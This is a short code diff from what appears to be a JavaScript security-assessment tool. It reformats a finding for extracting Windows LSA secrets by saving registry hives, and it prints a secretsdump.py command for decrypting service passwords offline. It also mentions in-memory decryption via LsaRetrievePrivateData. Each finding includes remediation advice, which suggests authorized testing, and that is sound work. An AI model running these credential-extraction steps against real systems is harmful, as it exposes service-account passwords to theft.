         const serviceStartName = svcInfo.stdout.match(/SERVICE_START_NAME\s*:\s*(.+)/)?.[1]?.trim() || "Unknown"
         output.push(`    Service: ${svc}  RunAs: ${serviceStartName}`)
       }
-      if (svcSecrets.length > 0) output.push(`\n[*] Decrypt service passwords: secretsdump.py -security SECURITY -system SYSTEM LOCAL`)
-      findings.push({ checkId: "WIN-CRED-020", provider: "windows", severity: passVal ? "critical" : "high", status: secSave.exitCode === 0 ? "EXECUTED" : "FAILED", resource: "lsa://secrets", title: "LSA Secrets extraction via cmd.exe reg save", details: `Hives saved to ${outdir}`, remediation: "Use gMSA for service accounts. Disable AutoLogon. Monitor reg hive access." })
+      if (svcSecrets.length > 0)
+        output.push(`\n[*] Decrypt service passwords: secretsdump.py -security SECURITY -system SYSTEM LOCAL`)
+      findings.push({
+        checkId: "WIN-CRED-020",
+        provider: "windows",
+        severity: passVal ? "critical" : "high",
+        status: secSave.exitCode === 0 ? "EXECUTED" : "FAILED",
+        resource: "lsa://secrets",
+        title: "LSA Secrets extraction via cmd.exe reg save",
+        details: `Hives saved to ${outdir}`,
+        remediation: "Use gMSA for service accounts. Disable AutoLogon. Monitor reg hive access.",
+      })
     }
     if (action === "decrypt") {
       output.push("[!] In-memory LSA decryption requires PS P/Invoke (LsaRetrievePrivateData)")
